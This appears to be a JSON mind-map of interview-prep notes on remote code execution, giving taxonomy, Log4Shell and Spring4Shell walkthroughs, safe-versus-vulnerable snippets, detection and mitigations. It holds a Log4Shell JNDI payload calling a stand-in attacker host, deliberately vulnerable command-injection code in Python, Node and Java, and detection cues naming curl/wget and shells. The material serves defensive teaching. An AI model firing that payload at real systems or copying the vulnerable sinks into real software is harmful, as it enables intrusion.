@@ -1,0 +1,1376 @@
+{
+  "id": "n8bfa3089b0ce55a",
+  "title": "Remote Code Execution (RCE)",
+  "markdown": "**Remote code execution (RCE)** means an attacker can **cause your system to run attacker-chosen code or system commands** on a machine you control-typically the **application server**, **worker**, or **container**. Vectors include **command injection**, **unsafe deserialization**, **template injection**, **expression language** injection, **known CVEs** in dependencies, and **misconfigured** plugins/runtimes. **Impact** scales with **privilege**, **network reachability**, and **secrets** on the host-not every RCE is instant \"root,\" but it is almost always **critical** from a risk standpoint.\n\nAligned with the **[Content Mastery Framework](../Interview%20Preparation/Content%20Mastery%20Framework.md)**.",
+  "notes": "Remote code execution (RCE) means an attacker can cause your system to run attacker-chosen code or system commands on a machine you control-typically the application server, worker, or container. Vectors include command injection, unsafe deserialization, template injection, expression language injection, known CVEs in dependencies, and misconfigured plugins/runtimes. Impact scales with privilege, network reachability, and secrets on the host-not every RCE is instant \"root,\" but it is almost always critical from a risk standpoint.\n\nAligned with the Content Mastery Framework.",
+  "expanded": true,
+  "children": [
+    {
+      "id": "n395609e21232014",
+      "title": "At a glance",
+      "markdown": "**Remote code execution (RCE)** means an attacker can **cause your system to run attacker-chosen code or system commands** on a machine you control-typically the **application server**, **worker**, or **container**. Vectors include **command injection**, **unsafe deserialization**, **template injection**, **expression language** injection, **known CVEs** in dependencies, and **misconfigured** plugins/runtimes. **Impact** scales with **privilege**, **network reachability**, and **secrets** on the host-not every RCE is instant \"root,\" but it is almost always **critical** from a risk standpoint.\n\nAligned with the **[Content Mastery Framework](../Interview%20Preparation/Content%20Mastery%20Framework.md)**.",
+      "notes": "Remote code execution (RCE) means an attacker can cause your system to run attacker-chosen code or system commands on a machine you control-typically the application server, worker, or container. Vectors include command injection, unsafe deserialization, template injection, expression language injection, known CVEs in dependencies, and misconfigured plugins/runtimes. Impact scales with privilege, network reachability, and secrets on the host-not every RCE is instant \"root,\" but it is almost always critical from a risk standpoint.\n\nAligned with the Content Mastery Framework.",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "Remote code execution (RCE) means an attacker can cause your system to run...",
+      "expanded": false
+    },
+    {
+      "id": "n194e5935f29f092",
+      "title": "L1 \u2014 What counts as RCE?",
+      "markdown": "**RCE:** Attacker supplies input that becomes **code execution** in the **victim process** (language VM, shell, template engine, expression evaluator, or native code via memory corruption).\n\n**Not always RCE:** **SQLi** that only reads data; **XSS** in browser (different trust boundary)-unless interviewer says \"RCE on admin's browser\" via **deserialization** in a browser context (rare framing).",
+      "notes": "RCE: Attacker supplies input that becomes code execution in the victim process (language VM, shell, template engine, expression evaluator, or native code via memory corruption).\n\nNot always RCE: SQLi that only reads data; XSS in browser (different trust boundary)-unless interviewer says \"RCE on admin's browser\" via deserialization in a browser context (rare framing).",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "RCE: Attacker supplies input that becomes code execution in the victim...",
+      "expanded": false
+    },
+    {
+      "id": "n8e6ef8d45476fd6",
+      "title": "L2 \u2014 Primary vectors (interview taxonomy)",
+      "markdown": "| Family | Mechanism sketch |\n|--------|------------------|\n| **OS command injection** | User input passed to `shell=True`, `exec()`, `os.system`, `Process.start` with concatenation |\n| **Code injection** | `eval`, unsafe **dynamic** `import`, **expression languages** (OGNL, SpEL, EL) |\n| **Deserialization** | Untrusted blob -> object graph -> **gadget chain** -> runtime primitive |\n| **SSTI** | User controls template -> **sandbox escape** |\n| **Dependency / supply chain** | Vulnerable library **JNDI** lookup, **Log4j**, **ImageMagick**, **Struts**, etc. |\n| **File upload + execution** | Web shell in executable path; **polyglot** files |\n| **Memory corruption** | Buffer overflow, UAF -> shellcode (often **exploit dev** track; still nameable in AppSec) |",
+      "notes": "| Family | Mechanism sketch |\n|--------|------------------|\n| OS command injection | User input passed to shell=True, exec(), os.system, Process.start with concatenation |\n| Code injection | eval, unsafe dynamic import, expression languages (OGNL, SpEL, EL) |\n| Deserialization | Untrusted blob -> object graph -> gadget chain -> runtime primitive |\n| SSTI | User controls template -> sandbox escape |\n| Dependency / supply chain | Vulnerable library JNDI lookup, Log4j, ImageMagick, Struts, etc. |\n| File upload + execution | Web shell in executable path; polyglot files |\n| Memory corruption | Buffer overflow, UAF -> shellcode (often exploit dev track; still nameable in AppSec) |",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "| Family | Mechanism sketch | |--------|------------------| | OS command...",
+      "expanded": false
+    },
+    {
+      "id": "n395fd94bf2d553d",
+      "title": "L2 \u2014 Minimal vulnerable vs safe patterns",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "ncda8e0077613d15",
+          "title": "Command injection (Python \u2014 illustrative)",
+          "markdown": "**Vulnerable:**\n\n```python\nimport os\nuser = request.args.get(\"q\")\nos.system(f\"convert input.png -resize 50% out.png {user}\")  # NEVER\n```\n\n**Safer:** Use **`subprocess.run`** with **argument list**, **no shell**, **fixed** binary path; validate **allowlisted** flags only.\n\n```python\nsubprocess.run([\"/usr/bin/convert\", \"input.png\", \"-resize\", \"50%\", \"out.png\"], check=True)\n```",
+          "notes": "Vulnerable:\n\nimport os\nuser = request.args.get(\"q\")\nos.system(f\"convert input.png -resize 50% out.png {user}\")  # NEVER\n\nSafer: Use subprocess.run with argument list, no shell, fixed binary path; validate allowlisted flags only.\n\nsubprocess.run([\"/usr/bin/convert\", \"input.png\", \"-resize\", \"50%\", \"out.png\"], check=True)",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Vulnerable: import os user = request.args.get(\"q\") os.system(f\"convert...",
+          "expanded": false
+        },
+        {
+          "id": "n04b1a7352cbbec3",
+          "title": "Java JNDI / Log4j class of issues (pattern)",
+          "markdown": "Untrusted data triggers a **lookup** to an attacker server -> **loads** attacker-controlled class. **Fix:** patch runtime, **disable** remote JNDI/class loading, **network egress** restrictions.",
+          "notes": "Untrusted data triggers a lookup to an attacker server -> loads attacker-controlled class. Fix: patch runtime, disable remote JNDI/class loading, network egress restrictions.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Untrusted data triggers a lookup to an attacker server -> loads...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Command injection (Python \u2014 illustrative)",
+      "expanded": true
+    },
+    {
+      "id": "n27acccfbbee3246",
+      "title": "Named examples (verify versions in real incidents)",
+      "markdown": "| Example | Primitive |\n|---------|-----------|\n| **Log4Shell (Log4j CVE-2021-44228)** | JNDI lookup from log message -> remote class load |\n| **Spring4Shell (CVE-2022-22965)** | Spring MVC data binding / classloader access on JDK 9+ |\n| **ImageTragick (CVE-2016-3714)** | ImageMagick delegate -> shell command execution |\n| **Shellshock (CVE-2014-6271)** | Bash env var function injection |\n| **ProxyShell / ProxyLogon** | Exchange chain -> RCE (enterprise IR stories) |\n| **Citrix Bleed (CVE-2023-4966)** | Buffer overread -> session token leak -> follow-on access |\n| **Deserialization chains** | **ysoserial**, **marshalsec** (Java); **pickle** abuse (Python) |\n\nUse **vendor advisories** and **NVD** for exact CVE metadata when preparing employer-specific loops.",
+      "notes": "| Example | Primitive |\n|---------|-----------|\n| Log4Shell (Log4j CVE-2021-44228) | JNDI lookup from log message -> remote class load |\n| Spring4Shell (CVE-2022-22965) | Spring MVC data binding / classloader access on JDK 9+ |\n| ImageTragick (CVE-2016-3714) | ImageMagick delegate -> shell command execution |\n| Shellshock (CVE-2014-6271) | Bash env var function injection |\n| ProxyShell / ProxyLogon | Exchange chain -> RCE (enterprise IR stories) |\n| Citrix Bleed (CVE-2023-4966) | Buffer overread -> session token leak -> follow-on access |\n| Deserialization chains | ysoserial, marshalsec (Java); pickle abuse (Python) |\n\nUse vendor advisories and NVD for exact CVE metadata when preparing employer-specific loops.",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "| Example | Primitive | |---------|-----------| | Log4Shell (Log4j...",
+      "expanded": false
+    },
+    {
+      "id": "n2051e66e595f36b",
+      "title": "L2 \u2014 CVE walkthrough: Log4Shell (architecture-level)",
+      "markdown": "**Flow:** Attacker sends `${jndi:ldap://attacker/a}` in a field that gets **logged** -> Log4j **lookup** resolves JNDI -> attacker-controlled **LDAP** returns **Reference** with **factory** -> JVM loads **remote class** -> **RCE**.\n\n**Containment (first 24h):** WAF rules (temporary), **disable lookups** (`log4j2.formatMsgNoLookups`), **patch** to fixed versions, **hunt** outbound LDAP/RMI/DNS from app subnets, **rotate** secrets on affected hosts.\n\n**Interview lesson:** **Never evaluate** untrusted strings as **active resolution** paths (JNDI, EL, templates, scripts).",
+      "notes": "Flow: Attacker sends ${jndi:ldap://attacker/a} in a field that gets logged -> Log4j lookup resolves JNDI -> attacker-controlled LDAP returns Reference with factory -> JVM loads remote class -> RCE.\n\nContainment (first 24h): WAF rules (temporary), disable lookups (log4j2.formatMsgNoLookups), patch to fixed versions, hunt outbound LDAP/RMI/DNS from app subnets, rotate secrets on affected hosts.\n\nInterview lesson: Never evaluate untrusted strings as active resolution paths (JNDI, EL, templates, scripts).",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "Flow: Attacker sends ${jndi:ldap://attacker/a} in a field that gets logged...",
+      "expanded": false
+    },
+    {
+      "id": "n99ce8a04979258f",
+      "title": "L2 \u2014 CVE walkthrough: Spring4Shell (pattern)",
+      "markdown": "**Pattern:** Attacker manipulates **request parameters** bound to **Java objects** to reach **ClassLoader** / **access rules** on vulnerable Spring + JDK combinations.\n\n**Fix:** Patch Spring; **WAF** secondary; **reduce** exposed actuator endpoints; **principle of least privilege** on app process.",
+      "notes": "Pattern: Attacker manipulates request parameters bound to Java objects to reach ClassLoader / access rules on vulnerable Spring + JDK combinations.\n\nFix: Patch Spring; WAF secondary; reduce exposed actuator endpoints; principle of least privilege on app process.",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "Pattern: Attacker manipulates request parameters bound to Java objects to...",
+      "expanded": false
+    },
+    {
+      "id": "n15cbbf065cc8c6c",
+      "title": "L2 \u2014 Additional language sinks",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n642f13721d4b756",
+          "title": "Node.js",
+          "markdown": "```javascript\n// Vulnerable - never pass user input to eval or child_process with shell\nconst user = req.query.cmd;\nrequire('child_process').exec(`convert ${user}`, ...);  // command injection\n\n// Safer\nconst { execFile } = require('child_process');\nexecFile('/usr/bin/convert', ['input.png', 'out.png'], ...);\n```",
+          "notes": "// Vulnerable - never pass user input to eval or childprocess with shell\nconst user = req.query.cmd;\nrequire('childprocess').exec(convert ${user}, ...);  // command injection\n\n// Safer\nconst { execFile } = require('childprocess');\nexecFile('/usr/bin/convert', ['input.png', 'out.png'], ...);",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "// Vulnerable - never pass user input to eval or childprocess with shell...",
+          "expanded": false
+        },
+        {
+          "id": "nbf4cb1ba1994fa9",
+          "title": "Java",
+          "markdown": "```java\n// Vulnerable patterns (search in reviews)\nRuntime.getRuntime().exec(\"sh -c \" + userInput);\nnew ObjectInputStream(untrustedStream).readObject();\n```",
+          "notes": "// Vulnerable patterns (search in reviews)\nRuntime.getRuntime().exec(\"sh -c \" + userInput);\nnew ObjectInputStream(untrustedStream).readObject();",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "// Vulnerable patterns (search in reviews) Runtime.getRuntime().exec(\"sh -c...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Node.js",
+      "expanded": true
+    },
+    {
+      "id": "n42dadc934e66db0",
+      "title": "L2 \u2014 Tooling interviewers expect",
+      "markdown": "| Tool | Use |\n|------|-----|\n| **Semgrep / CodeQL** | Find exec, eval, deserialization sinks |\n| **Burp Scanner** | Confirm web RCE chains |\n| **ysoserial** (lab) | Demonstrate Java gadget *existence* |\n| **nuclei** | Known CVE templates |\n| **Falco / EDR** | Detect shell from app user |",
+      "notes": "| Tool | Use |\n|------|-----|\n| Semgrep / CodeQL | Find exec, eval, deserialization sinks |\n| Burp Scanner | Confirm web RCE chains |\n| ysoserial (lab) | Demonstrate Java gadget existence |\n| nuclei | Known CVE templates |\n| Falco / EDR | Detect shell from app user |",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "| Tool | Use | |------|-----| | Semgrep / CodeQL | Find exec, eval,...",
+      "expanded": false
+    },
+    {
+      "id": "n226c82a8b4dc26e",
+      "title": "L3 \u2014 Detection",
+      "markdown": "Logs: unexpected child processes, /bin/sh, curl/wget from app user.",
+      "notes": "Logs: unexpected child processes, /bin/sh, curl/wget from app user.",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n995e9313191878e",
+          "title": "Logs: unexpected child processes, /bin/sh, curl/wget from app user.",
+          "markdown": "- Logs: unexpected child processes, /bin/sh, curl/wget from app user.",
+          "notes": "Logs: unexpected child processes, /bin/sh, curl/wget from app user.",
+          "blurb": "Logs: unexpected child processes, /bin/sh, curl/wget from app user.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n8a6d66f946a6944",
+          "title": "EDR / Falco: shell spawned by java, node, ruby.",
+          "markdown": "- EDR / Falco: shell spawned by java, node, ruby.",
+          "notes": "EDR / Falco: shell spawned by java, node, ruby.",
+          "blurb": "EDR / Falco: shell spawned by java, node, ruby.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n560e5427dc1e330",
+          "title": "Static analysis: Semgrep rules for exec, eval, pickle.loads, ObjectInputStream, yaml.loa",
+          "markdown": "- Static analysis: Semgrep rules for exec, eval, pickle.loads, ObjectInputStream, yaml.loa",
+          "notes": "Static analysis: Semgrep rules for exec, eval, pickle.loads, ObjectInputStream, yaml.loa",
+          "blurb": "Static analysis: Semgrep rules for exec, eval, pickle.loads,...",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "na01a8c83671b519",
+          "title": "Dependencies: SCA (Snyk, Dependabot, OSV) for known RCE CVEs.",
+          "markdown": "- Dependencies: SCA (Snyk, Dependabot, OSV) for known RCE CVEs.",
+          "notes": "Dependencies: SCA (Snyk, Dependabot, OSV) for known RCE CVEs.",
+          "blurb": "Dependencies: SCA (Snyk, Dependabot, OSV) for known RCE CVEs.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        }
+      ],
+      "blurb": "Logs: unexpected child processes, /bin/sh, curl/wget from app user.",
+      "expanded": true
+    },
+    {
+      "id": "n4224fe277bceec3",
+      "title": "L3 \u2014 Mitigations (tiered)",
+      "markdown": "Eliminate shell: Never pass user data to a shell; argv arrays only.",
+      "notes": "Eliminate shell: Never pass user data to a shell; argv arrays only.",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "nffbe952f483925d",
+          "title": "Eliminate shell: Never pass user data to a shell; argv arrays only.",
+          "markdown": "- Eliminate shell: Never pass user data to a shell; argv arrays only.",
+          "notes": "Eliminate shell: Never pass user data to a shell; argv arrays only.",
+          "blurb": "Eliminate shell: Never pass user data to a shell; argv arrays only.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "nc492e5b585a8549",
+          "title": "No eval on untrusted input.",
+          "markdown": "- No eval on untrusted input.",
+          "notes": "No eval on untrusted input.",
+          "blurb": "No eval on untrusted input.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n1fe72bf46cbf5c9",
+          "title": "Deserialization: sign payloads, use JSON + DTOs, avoid native binary formats from users.",
+          "markdown": "- Deserialization: sign payloads, use JSON + DTOs, avoid native binary formats from users.",
+          "notes": "Deserialization: sign payloads, use JSON + DTOs, avoid native binary formats from users.",
+          "blurb": "Deserialization: sign payloads, use JSON + DTOs, avoid native binary formats...",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n34235c131054a1f",
+          "title": "Templates: logic-less templates or strict sandboxes.",
+          "markdown": "- Templates: logic-less templates or strict sandboxes.",
+          "notes": "Templates: logic-less templates or strict sandboxes.",
+          "blurb": "Templates: logic-less templates or strict sandboxes.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n61cef3afe4f6180",
+          "title": "Patch dependencies fast on RCE CVEs; SBOM + automated PRs.",
+          "markdown": "- Patch dependencies fast on RCE CVEs; SBOM + automated PRs.",
+          "notes": "Patch dependencies fast on RCE CVEs; SBOM + automated PRs.",
+          "blurb": "Patch dependencies fast on RCE CVEs; SBOM + automated PRs.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "nfdb7241cb3ac1ec",
+          "title": "Runtime: non-root containers, read-only rootfs, seccomp/AppArmor, egress deny-by-default",
+          "markdown": "- Runtime: non-root containers, read-only rootfs, seccomp/AppArmor, egress deny-by-default",
+          "notes": "Runtime: non-root containers, read-only rootfs, seccomp/AppArmor, egress deny-by-default",
+          "blurb": "Runtime: non-root containers, read-only rootfs, seccomp/AppArmor, egress...",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "nf94bde74af55647",
+          "title": "Secrets: assume exfil after RCE-rotate, short-lived credentials.",
+          "markdown": "- Secrets: assume exfil after RCE-rotate, short-lived credentials.",
+          "notes": "Secrets: assume exfil after RCE-rotate, short-lived credentials.",
+          "blurb": "Secrets: assume exfil after RCE-rotate, short-lived credentials.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        }
+      ],
+      "blurb": "Eliminate shell: Never pass user data to a shell; argv arrays only.",
+      "expanded": false
+    },
+    {
+      "id": "nd550dc065eaa623",
+      "title": "L3 \u2014 Why \u201cwe have a WAF\u201d fails interviews",
+      "markdown": "WAFs **miss** deserialization, **file** bugs, **internal** admin plugins, and **novel** gadgets. **Depth:** code + dependency + **runtime** hardening.",
+      "notes": "WAFs miss deserialization, file bugs, internal admin plugins, and novel gadgets. Depth: code + dependency + runtime hardening.",
+      "kind": "topic",
+      "level": 2,
+      "children": [],
+      "blurb": "WAFs miss deserialization, file bugs, internal admin plugins, and novel...",
+      "expanded": false
+    },
+    {
+      "id": "nbf5bdc993b55f3c",
+      "title": "Hands-on (authorized labs)",
+      "markdown": "DVWA / WebGoat command injection modules.",
+      "notes": "DVWA / WebGoat command injection modules.",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n08e21b0b6fb430b",
+          "title": "DVWA / WebGoat command injection modules.",
+          "markdown": "- DVWA / WebGoat command injection modules.",
+          "notes": "DVWA / WebGoat command injection modules.",
+          "blurb": "DVWA / WebGoat command injection modules.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n4cc755ef79dbfff",
+          "title": "PortSwigger SSTI / deserialization labs.",
+          "markdown": "- PortSwigger SSTI / deserialization labs.",
+          "notes": "PortSwigger SSTI / deserialization labs.",
+          "blurb": "PortSwigger SSTI / deserialization labs.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "nfb68e8a6c94d126",
+          "title": "Local Log4j test harness in an isolated VM (lab only).",
+          "markdown": "- Local Log4j test harness in an isolated VM (lab only).",
+          "notes": "Local Log4j test harness in an isolated VM (lab only).",
+          "blurb": "Local Log4j test harness in an isolated VM (lab only).",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        }
+      ],
+      "blurb": "DVWA / WebGoat command injection modules.",
+      "expanded": false
+    },
+    {
+      "id": "nf93a6a7e712ac5a",
+      "title": "L4 \u2014 Interview clusters",
+      "markdown": "",
+      "notes": "",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n598f1b0c3c86239",
+          "title": "Junior",
+          "markdown": "- Define RCE; difference from **SQLi** reading data.",
+          "notes": "- Define RCE; difference from SQLi reading data.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Define RCE; difference from SQLi reading data.",
+          "expanded": false
+        },
+        {
+          "id": "nf559e982be1f5a2",
+          "title": "Mid",
+          "markdown": "- Safe **`subprocess`** pattern; why **shell=True** is toxic.",
+          "notes": "- Safe subprocess pattern; why shell=True is toxic.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Safe subprocess pattern; why shell=True is toxic.",
+          "expanded": false
+        },
+        {
+          "id": "n3ba5711fb91ed87",
+          "title": "Senior",
+          "markdown": "- **Container** breakout vs **app** RCE-what limits impact?\n- **Log4j** response in **first 24 hours** (contain, patch, hunt, rotate).",
+          "notes": "- Container breakout vs app RCE-what limits impact?\n- Log4j response in first 24 hours (contain, patch, hunt, rotate).",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Container breakout vs app RCE-what limits impact?",
+          "expanded": false
+        },
+        {
+          "id": "na2b05fc96526a7c",
+          "title": "Staff",
+          "markdown": "- **Org-wide** control: **default-deny egress**, **Falco** alerts, **SLSA** / provenance for **artifacts**.",
+          "notes": "- Org-wide control: default-deny egress, Falco alerts, SLSA / provenance for artifacts.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "blurb": "Org-wide control: default-deny egress, Falco alerts, SLSA / provenance for...",
+          "expanded": false
+        }
+      ],
+      "blurb": "Includes Junior",
+      "expanded": false
+    },
+    {
+      "id": "n99c65840896f0dd",
+      "title": "Authoritative references",
+      "markdown": "CWE-78 (OS command injection), CWE-94 (code injection), CWE-502 (unsafe deserialization) - OWASP cheat sheets: Injection, Deserialization - NIST SSDF themes for patch and build security",
+      "notes": "CWE-78 (OS command injection), CWE-94 (code injection), CWE-502 (unsafe deserialization) - OWASP cheat sheets: Injection, Deserialization - NIST SSDF themes for patch and build security",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n106ddc93b47b96d",
+          "title": "CWE-78 (OS command injection), CWE-94 (code injection), CWE-502 (unsafe deserialization)",
+          "markdown": "- CWE-78 (OS command injection), CWE-94 (code injection), CWE-502 (unsafe deserialization)",
+          "notes": "CWE-78 (OS command injection), CWE-94 (code injection), CWE-502 (unsafe deserialization)",
+          "blurb": "CWE-78 (OS command injection), CWE-94 (code injection), CWE-502 (unsafe...",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n13486950754379f",
+          "title": "OWASP cheat sheets: Injection, Deserialization",
+          "markdown": "- OWASP cheat sheets: Injection, Deserialization",
+          "notes": "OWASP cheat sheets: Injection, Deserialization",
+          "blurb": "OWASP cheat sheets: Injection, Deserialization",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n13b4e7c55cd837b",
+          "title": "NIST SSDF themes for patch and build security",
+          "markdown": "- NIST SSDF themes for patch and build security",
+          "notes": "NIST SSDF themes for patch and build security",
+          "blurb": "NIST SSDF themes for patch and build security",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        }
+      ],
+      "blurb": "CWE-78 (OS command injection), CWE-94 (code injection), CWE-502 (unsafe...",
+      "expanded": false
+    },
+    {
+      "id": "n0359dd44afd34c8",
+      "title": "Verification checklist",
+      "markdown": "[ ] Explain three distinct paths to RCE without saying \"injection\" only once.",
+      "notes": "[ ] Explain three distinct paths to RCE without saying \"injection\" only once.",
+      "kind": "topic",
+      "level": 2,
+      "children": [
+        {
+          "id": "n8c6783744123b5b",
+          "title": "[ ] Explain three distinct paths to RCE without saying \"injection\" only once.",
+          "markdown": "- [ ] Explain three distinct paths to RCE without saying \"injection\" only once.",
+          "notes": "[ ] Explain three distinct paths to RCE without saying \"injection\" only once.",
+          "blurb": "[ ] Explain three distinct paths to RCE without saying \"injection\" only once.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n2d05a0f2bed3ed0",
+          "title": "[ ] Whiteboard safe vs unsafe subprocess.",
+          "markdown": "- [ ] Whiteboard safe vs unsafe subprocess.",
+          "notes": "[ ] Whiteboard safe vs unsafe subprocess.",
+          "blurb": "[ ] Whiteboard safe vs unsafe subprocess.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "nacb9fb72d5ebb58",
+          "title": "[ ] Walk Log4j at architecture level (lookup -> load -> code).",
+          "markdown": "- [ ] Walk Log4j at architecture level (lookup -> load -> code).",
+          "notes": "[ ] Walk Log4j at architecture level (lookup -> load -> code).",
+          "blurb": "[ ] Walk Log4j at architecture level (lookup -> load -> code).",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        },
+        {
+          "id": "n4b2de3f12beeb5a",
+          "title": "[ ] List four container hardening controls that limit post-RCE.",
+          "markdown": "- [ ] List four container hardening controls that limit post-RCE.",
+          "notes": "[ ] List four container hardening controls that limit post-RCE.",
+          "blurb": "[ ] List four container hardening controls that limit post-RCE.",
+          "kind": "topic",
+          "level": 3,
+          "children": [],
+          "expanded": false
+        }
+      ],
+      "blurb": "[ ] Explain three distinct paths to RCE without saying \"injection\" only once.",
+      "expanded": false
+    },
+    {
+      "id": "n2fc901ec84089cd",
+      "title": "Quick recall",
+      "markdown": "Attacker causes **your server/worker** to **run attacker-controlled code or OS commands**.",
+      "notes": "Attacker causes your server/worker to run attacker-controlled code or OS commands.",
+      "expanded": false,
+      "kind": "group",
+      "children": [
+        {
+          "id": "ncd5c2002eb64672",
+          "title": "Major vectors",
+          "markdown": "| Vector | Examples |\n|--------|----------|\n| **Command injection** | `os.system`, `shell=True`, backticks in PHP |\n| **Unsafe deserialization** | Java `ObjectInputStream`, Python `pickle`, .NET `BinaryFormatter` |\n| **SSTI / EL** | Jinja2, Twig, Freemarker, SpEL, OGNL |\n| **Dependency CVE** | Log4j JNDI, ImageTragick, Struts |\n| **Upload + exec** | `.jsp` / `.php` in web root, polyglot |",
+          "notes": "| Vector | Examples |\n|--------|----------|\n| Command injection | os.system, shell=True, backticks in PHP |\n| Unsafe deserialization | Java ObjectInputStream, Python pickle, .NET BinaryFormatter |\n| SSTI / EL | Jinja2, Twig, Freemarker, SpEL, OGNL |\n| Dependency CVE | Log4j JNDI, ImageTragick, Struts |\n| Upload + exec | .jsp / .php in web root, polyglot |",
+          "kind": "topic",
+          "level": 2,
+          "children": [],
+          "blurb": "| Vector | Examples | |--------|----------| | Command injection | os.system,...",
+          "expanded": false
+        },
+        {
+          "id": "necc1e7bc8d4a9ac",
+          "title": "CWEs (quick)",
+          "markdown": "CWE-78 - OS command injection - CWE-94 - code injection - CWE-502 - unsafe deserialization",
+          "notes": "CWE-78 - OS command injection - CWE-94 - code injection - CWE-502 - unsafe deserialization",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nacc8d6c77b9cd15",
+              "title": "CWE-78 - OS command injection",
+              "markdown": "- CWE-78 - OS command injection",
+              "notes": "CWE-78 - OS command injection",
+              "blurb": "CWE-78 - OS command injection",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n1599747a673facf",
+              "title": "CWE-94 - code injection",
+              "markdown": "- CWE-94 - code injection",
+              "notes": "CWE-94 - code injection",
+              "blurb": "CWE-94 - code injection",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nab0285ec15bd710",
+              "title": "CWE-502 - unsafe deserialization",
+              "markdown": "- CWE-502 - unsafe deserialization",
+              "notes": "CWE-502 - unsafe deserialization",
+              "blurb": "CWE-502 - unsafe deserialization",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            }
+          ],
+          "blurb": "CWE-78 - OS command injection - CWE-94 - code injection - CWE-502 - unsafe...",
+          "expanded": false
+        },
+        {
+          "id": "n22709a18fd85d5b",
+          "title": "Safe patterns",
+          "markdown": "subprocess: list argv, shell=False, fixed binary path - No eval on untrusted data - JSON + schema instead of native binary deserialization - Patch RCE CVEs same-day class; SBOM + automation",
+          "notes": "subprocess: list argv, shell=False, fixed binary path - No eval on untrusted data - JSON + schema instead of native binary deserialization - Patch RCE CVEs same-day class; SBOM + automation",
+          "kind": "topic",
+          "level": 2,
+          "children": [
+            {
+              "id": "nb85eb5f4e5c78dc",
+              "title": "subprocess: list argv, shell=False, fixed binary path",
+              "markdown": "- subprocess: list argv, shell=False, fixed binary path",
+              "notes": "subprocess: list argv, shell=False, fixed binary path",
+              "blurb": "subprocess: list argv, shell=False, fixed binary path",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "n2ba0b41c2cdb392",
+              "title": "No eval on untrusted data",
+              "markdown": "- No eval on untrusted data",
+              "notes": "No eval on untrusted data",
+              "blurb": "No eval on untrusted data",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nf646f2f29b95f60",
+              "title": "JSON + schema instead of native binary deserialization",
+              "markdown": "- JSON + schema instead of native binary deserialization",
+              "notes": "JSON + schema instead of native binary deserialization",
+              "blurb": "JSON + schema instead of native binary deserialization",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
+              "expanded": false
+            },
+            {
+              "id": "nc7c1fe962f93431",
+              "title": "Patch RCE CVEs same-day class; SBOM + automation",
+              "markdown": "- Patch RCE CVEs same-day class; SBOM + automation",
+              "notes": "Patch RCE CVEs same-day class; SBOM + automation",
+              "blurb": "Patch RCE CVEs same-day class; SBOM + automation",
+              "kind": "topic",
+              "level": 3,
+              "children": [],
